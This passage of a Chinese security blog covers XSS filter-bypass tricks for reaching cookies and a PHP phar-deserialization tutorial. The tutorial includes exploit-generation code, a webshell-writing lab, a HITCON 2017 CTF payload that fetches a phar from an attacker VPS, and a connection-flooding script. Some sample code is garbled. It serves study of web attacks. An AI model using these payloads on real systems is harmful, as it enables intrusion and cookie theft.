<p>在平时我们在或者cookie的时候，一般用的是document.cooie，通过全局变量的bypass我们可以大大将或者cookie的语句复杂化进而Bypass掉某些规则</p>
<p>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self[Object.keys(self)[9]][&quot;\x63\x6f\x6f\x6b\x69\x65&quot;]</span><br></pre></td></tr></table></figure>

<p>我再弄的复杂点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self[Object.keys(self)[9]][self[Object.keys(self)[171]](&#39;Y29va2ll&#39;)]</span><br></pre></td></tr></table></figure>

<p>这个索引号同样也可以复杂化</p>
<p>定义一个a函数，这个a函数代表的就是查找索引号的结果，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;()&#x3D;&gt;&#123;c&#x3D;0;for(i in self)&#123;if(&#x2F;^a[rel]+t$&#x2F;.test(i))&#123;return c&#125;c++&#125;&#125; &#x2F;&#x2F;找到索引</span><br><span class="line"></span><br><span class="line">self[Object.keys(self)[a()]](&quot;1&quot;)</span><br><span class="line">&#x2F;&#x2F;弹窗</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://xz.aliyun.com/t/5863" target="_blank" rel="noopener">https://xz.aliyun.com/t/5863</a></p>
<p><a href="https://xz.aliyun.com/t/5950#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/5950#toc-13</a></p>
<p><a href="http://drops.xmd5.com/static/drops/tips-689.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-689.html</a></p>
<p><a href="https://blog.zeddyu.info/2019/03/13/Web安全从零开始-XSS-I/#Encode" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-I/#Encode</a></p>
<p><a href="https://www.anquanke.com/post/id/176185#h3-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176185#h3-7</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/75785844" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/75785844</a></p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>利用phar反序列化拓展攻击面</title>
    <url>/2019/06/30/%E5%88%A9%E7%94%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>说是要写一下<code>phar</code>反序列化的东西，但是首先还是想写一些<code>php</code>反序列化的要点，来加深一下理解。</p>
<h3 id="php反序列化要点"><a href="#php反序列化要点" class="headerlink" title="php反序列化要点"></a>php反序列化要点</h3><p>在圆圆师傅的博客中看到<code>php</code>反序列漏洞的小名叫做<code>php</code>对象的属性篡改漏洞，真的觉得这个称呼再合适不过了<code>hhhh</code>，因为反序列化中传递的只用属性的值，以及对应的属性的权限(即<code>private,public,protected</code>)</p>
<h4 id="常用魔术方法作用："><a href="#常用魔术方法作用：" class="headerlink" title="常用魔术方法作用："></a>常用魔术方法作用：</h4><ul>
<li><code>construct()</code>:当对象创建时自动调用(也就是<code>new</code>的时候),要注意的是<code>construct</code>在<code>unserialize</code>时是不会自动调用的</li>
<li><code>wakeup()</code>：<code>unserialize()</code>时自动调用</li>
<li><code>sleep()</code>: <code>serialize()</code>时自动调用</li>
<li><code>toString()</code>:当对象被当作字符串输出时调用</li>
<li><code>get()</code>：当调用不可访问或者不存在的属性，调用此方法</li>
<li><code>call()</code>：当调用不存在的方法时，调用</li>
</ul>
<h4 id="关于toString的一些tip-触发条件如下："><a href="#关于toString的一些tip-触发条件如下：" class="headerlink" title="关于toString的一些tip,触发条件如下："></a>关于<code>toString</code>的一些<code>tip</code>,触发条件如下：</h4><p>(1)<code>echo ($obj) / print($obj)</code> 打印时会触发</p>
<p>(2)反序列化对象与字符串连接时</p>
<p>(3)反序列化对象参与格式化字符串时</p>
<p>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p>
<p>(5)反序列化对象参与格式化<code>SQL语句</code>，绑定参数时</p>
<p>(6)反序列化对象在经过<code>php字符串函数</code>，如 <code>strlen()、addslashes()</code>时</p>
<p>(7)在<code>in_array()</code>方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong><code>toString</code>会被调用</p>
<p>(8)反序列化的对象作为 <code>class_exists()</code>的参数的时候</p>
<h4 id="易忽略的属性值"><a href="#易忽略的属性值" class="headerlink" title="易忽略的属性值"></a>易忽略的属性值</h4><p>对于<code>public</code>属性的成员不用在意，但对于<code>private</code>和<code>protected</code>的成员一定要特别注意<code>%00</code>,这个点直接输出是看不到的，不过我们可以通过查看网页源代码来避免这个问题。</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z1H981.png" alt="Z1H981.png"></p>
<p>将方块改为<code>%00</code>就ok。</p>
<h4 id="反序列化限制条件"><a href="#反序列化限制条件" class="headerlink" title="反序列化限制条件"></a>反序列化限制条件</h4><ul>
<li>有<code>unserialize</code>函数。</li>
<li>在反序列化的时候一定要在当前作用域进行。</li>
<li>反序列化攻击实际为属性篡改攻击。</li>
<li>反序列化参数可以控制</li>
</ul>
<h3 id="由phar反序列化拓展的攻击面"><a href="#由phar反序列化拓展的攻击面" class="headerlink" title="由phar反序列化拓展的攻击面"></a>由phar反序列化拓展的攻击面</h3><p>正常的<code>php</code>反序列化限制条件是很多的，如：要有<code>unserialize</code>函数，参数要可控，要在当前作用域进行(其实<code>phar</code>反序列化也要),但是<code>phar</code>反序列化则打破了这一常规，即<strong>不通过<code>unserialize</code>就可以进行反序列化</strong>。</p>
<h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a><strong>phar文件结构</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Phar%E6%A0%BC%E5%BC%8F%E5%BF%85%E9%A1%BB%E8%A6%81%E6%B1%82%E7%9A%84.png" alt="此处输入图片的描述"></p>
<ul>
<li><strong>a stub</strong></li>
</ul>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/stub.png" alt="此处输入图片的描述"></p>
<p><code>phar</code>文件将<code>php</code>复杂化的结构形式为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure>

<p>(这里其实通过修改前面的xxx就可以进行文件伪造)</p>
<ul>
<li><strong>a manifest describing the contents</strong></li>
</ul>
<p>这里其实是<code>phar</code>反序列化中比较重要的一点，<code>phar</code>本身为一个压缩文件，而<code>phar</code>文件则储存着每个文件的权限与属性信息，并且以序列化的形式储存用户自定义的<code>meta-data</code></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20manifest.png" alt="此处输入图片的描述"></p>
<ul>
<li><strong>the file contents</strong></li>
</ul>
<p>此部分内容为添加在<code>phar</code>添加的压缩文件以及内容。</p>
<ul>
<li><strong>signature</strong></li>
</ul>
<p>签名，放在末尾。</p>
<h4 id="构造phar压缩文件"><a href="#构造phar压缩文件" class="headerlink" title="构造phar压缩文件"></a><strong>构造phar压缩文件</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line"></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line"></span><br><span class="line">    $o &#x3D; new TestObject();</span><br><span class="line"></span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line"></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>要注意的是一定要在<code>php.ini</code>中关闭<code>phar-readonly</code>,我在<code>windows</code>弄的有点迷，所以直接在<code>ubuntu</code>上弄了，还蛮流畅的。</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z1zMxH.png" alt="Z1zMxH.png"></p>
<p>通过<code>winhex</code>可以更清晰的看到我们的属性已经被序列化</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z1zsZq.png" alt="Z1zsZq.png"></p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Destruct called'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">'phar://phar.phar/test.txt'</span>;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从下面图片可以看出已经成功进行了反序列化</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z3SJX9.png" alt="Z3SJX9.png"></p>
<p>受<code>phar</code>反序列化影响的文件函数还有：</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYgm6S.png" alt="ZYgm6S.png"></p>
<p>可以<code>phar</code>反序列化的攻击面还是很广的。</p>
<h3 id="phar反序列化实战"><a href="#phar反序列化实战" class="headerlink" title="phar反序列化实战"></a>phar反序列化实战</h3><p>在安全客上看到了一位师傅写的比较简单的<code>phar</code>反序列化练习代码，拿来练一下手</p>
<p>简单入门</p>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost/test/upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"hpdoger"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*返回后缀名函数*/</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> substr($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*检测MIME类型是否为gif*/</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'hpdoger'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Not allowed !"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $filenameExt = strtolower(getExt($_FILES[<span class="string">'hpdoger'</span>][<span class="string">'name'</span>]));    <span class="comment">/*提取后缀名*/</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span>($filenameExt != <span class="string">'gif'</span>)&#123;</span><br><span class="line">​        <span class="keyword">echo</span> <span class="string">"Not gif !"</span>;</span><br><span class="line">​    &#125;</span><br><span class="line">​    <span class="keyword">else</span>&#123;</span><br><span class="line">​        move_uploaded_file($_FILES[<span class="string">'hpdoger'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'hpdoger'</span>][<span class="string">'name'</span>]);</span><br><span class="line">​        <span class="keyword">echo</span> <span class="string">"Successfully！"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>attack.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $recieve = $_GET[<span class="string">'recieve'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*写入文件类操作*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">not_useful</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $file;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">​    $fp = fopen(<span class="string">"F:\\phpstudy\\WWW\\test\shell.php"</span>,<span class="string">"w"</span>); <span class="comment">//自定义写入路径</span></span><br><span class="line">​    fputs($fp,<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">​    fclose($fp);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line">file_get_contenecieve);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击<code>exp</code>生成代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">not_useful</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $file=<span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> not_useful();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将生成的<code>phar.phar</code>改为<code>phar.gif</code>上传，在<code>attack.php</code>中访问<a href="http://localhost/test/attack.php?recieve=phar://phar.gif/text.txt" target="_blank" rel="noopener">http://localhost/test/attack.php?recieve=phar://phar.gif/text.txt</a></p>
<p>最后访问<code>shell.php</code></p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z3CHnH.png" alt="Z3CHnH.png"></p>
<p>成功执行。</p>
<h4 id="Hitcon2017"><a href="#Hitcon2017" class="headerlink" title="Hitcon2017"></a><strong>Hitcon2017</strong></h4><p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $FLAG    = create_function(<span class="string">""</span>, <span class="string">'die(`/read_flag`);'</span>);                    <span class="comment">// 得到 flag 的匿名函数</span></span><br><span class="line">    $SECRET  = `/read_secret`;</span><br><span class="line">    $SANDBOX = <span class="string">"/var/www/data/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);   <span class="comment">// 根据 remote_addr 给每个人创建一个沙盒</span></span><br><span class="line">    @mkdir($SANDBOX);</span><br><span class="line">    @chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;                </span><br><span class="line">        $data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">        $hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET);</span><br><span class="line">        setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));      <span class="comment">//将每个人唯一的沙盒对象加上签名后作为 session-data</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $avatar;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = $path;                                          <span class="comment">//设置了头像的路径为沙盒路径</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span></span><br><span class="line">                .<span class="string">"  global \$FLAG; \$FLAG();"</span>                                <span class="comment">/*反序列化这个对象就能创建一个随机名字的函数，调用这个函数就能调用 flag，实际上这是一个骗局，匿名函数也是有名字的*/</span></span><br><span class="line">                .<span class="string">"&#125;"</span>);</span><br><span class="line">            $_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $SECRET;</span><br><span class="line">        $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">        <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">        $data = unserialize($data);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">        <span class="keyword">return</span> $data-&gt;avatar;                                               <span class="comment">//判断身份，如果身份正确返回头像路径(沙盒路径)</span></span><br><span class="line">                                                                            <span class="comment">//该函数不可绕过</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);            <span class="comment">//获取头像，检查头是否为GIF89a ，正确后存入沙盒,</span></span><br><span class="line">                                                                            <span class="comment">//这个就是利用 phar:// 进行反序列化的点</span></span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">        file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;                                                 <span class="comment">//获取这个沙盒中的头像，</span></span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($path . <span class="string">"/avatar.gif"</span>) )</span><br><span class="line">            $path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">        header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line">        <span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line">    <span class="keyword">if</span> ($mode == <span class="string">"upload"</span>)</span><br><span class="line">        upload(check_session());</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>)</span><br><span class="line">        show(check_session());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>)</span><br></pre></td></tr></table></figure>

<p><strong>create_function函数分析()</strong></p>
<p>通过看大佬们的分析还真是涨了不少知识..,首先还是看一波``create_function`的官方文档</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z3E3pq.png" alt="Z3E3pq.png"></p>
<p>匿名函数的形式为<code>\0lambda_%</code>,<code>%d</code>为数字并且取决于匿名函数的个数，我们每访问一次题目，就会生成一个匿名函数，所以匿名函数的名字无法很好的去确定，但是，Apache的prefork模式则带来了一个很好的助攻。</p>
<blockquote>
<p>prefork模式可以算是很古老但是非常稳定的Apache模式。Apache在启动之初，就预先fork一些子进程，然后等待请求进来。之所以这样做，是为了减少频繁创建和销毁进程的开销。每个子进程只有一个线程，在一个时间点内，只能处理一个请求</p>
</blockquote>
<p>所以，当采用prefork工作模式的情况下，只要我们请求过大，并且超过默认设定的阙值，则会启动新的线程来处理请求，在新的线程中，匿名又会从1开始递增，这样我们就可以控制匿名函数的名字了。</p>
<p><strong>unserialize处分析</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $SECRET;</span><br><span class="line">    $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">    <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac) )</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">    $data = unserialize($data);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">    <span class="keyword">return</span> $data-&gt;avatar;                                               <span class="comment">//判断身份，如果身份正确返回头像路径(沙盒路径)</span></span><br><span class="line">                                                                        <span class="comment">//该函数不可绕过</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过逻辑分析一下这里的<code>unserialize</code>是无法利用的,因为前面有一个根本不可能绕过的点<code>!hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac)</code>如果<code>hmac</code>变量无法通过<code>hash</code>去解密，则程序会直接停止运行，所以<code>unserialize</code>处并没有办法进行反序列化。</p>
<p><strong>phar反序列化攻击</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $avatar;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = $path;                                          <span class="comment">//设置了头像的路径为沙盒路径</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span></span><br><span class="line">            .<span class="string">"  global \$FLAG; \$FLAG();"</span>                                <span class="comment">/*反序列化这个对象就能创建一个随机名字的函数，调用这个函数就能调用 flag，实际上这是一个骗局，匿名函数也是有名字的*/</span></span><br><span class="line">            .<span class="string">"&#125;"</span>);</span><br><span class="line">        $_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类函数的分析，如果反序列化成功，则会先去调用<code>destruct()</code>魔法 函数，但是这个<code>eval</code>其实并不能得到<code>flag</code>，因为前面的<code>random</code>值是随机的，所以真正获取<code>flag</code>的还是<code>$_GET[&#39;luckey&#39;]</code>，首先在自己的vps通过如下代码生成一个<code>avatar.phar</code>并且更名为<code>avatar.gif</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = <span class="string">'avatar.gif'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; &#125;</span><br><span class="line">$o = <span class="keyword">new</span> Admin();</span><br><span class="line">$filename = <span class="string">'avatar.phar'</span>;</span><br><span class="line">@unlink($filename);</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并且通过<code>http://题目IP/index.php?m=upload&amp;url=http://VPS_IP/</code>将avatar.gif上传上去。</p>
<p>第二次通过<code>phar</code>协议调用直接进行反序列化调用<code>destruct</code>函数进行<code>getflag</code>,<code>payload</code>为</p>
<p><code>http://题目IP/index.php?m=upload&amp;url=phar:///var/www/data/md5(your_ip)/&amp;lucky=%00lambda_1</code></p>
<p>七月火师傅的通过请求使<code>Apache</code>开启新线程的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">import</span> requests</span><br><span class="line"><span class="number">2.</span> <span class="keyword">import</span> socket</span><br><span class="line"><span class="number">3.</span> <span class="keyword">import</span> time</span><br><span class="line"><span class="number">4.</span> <span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="number">5.</span> <span class="keyword">try</span>:</span><br><span class="line"><span class="number">6.</span> ​    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="number">7.</span> <span class="keyword">except</span>:</span><br><span class="line"><span class="number">8.</span> ​    <span class="keyword">pass</span></span><br><span class="line"><span class="number">9.</span> </span><br><span class="line"><span class="number">10.</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="number">11.</span> ​    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="number">12.</span> ​        HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="number">13.</span> ​        PORT = <span class="number">8000</span></span><br><span class="line"><span class="number">14.</span> ​        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="number">15.</span> ​        s.connect((HOST, PORT))</span><br><span class="line"><span class="number">16.</span> ​        s.sendall(<span class="string">'GET /avatar.gif HTTP/1.1\nHost: localhost\nConnection: Keep-Alive\n\n'</span>)</span><br><span class="line"><span class="number">17.</span> ​        *<span class="comment"># s.close()*</span></span><br><span class="line"><span class="number">18.</span> ​        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line"><span class="number">19.</span> ​        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="number">20.</span> </span><br><span class="line"><span class="number">21.</span> i = <span class="number">8</span></span><br><span class="line"><span class="number">22.</span> pool = ThreadPool( i )</span><br><span class="line"><span class="number">23.</span> result = pool.map_async( run, range(i) ).get(<span 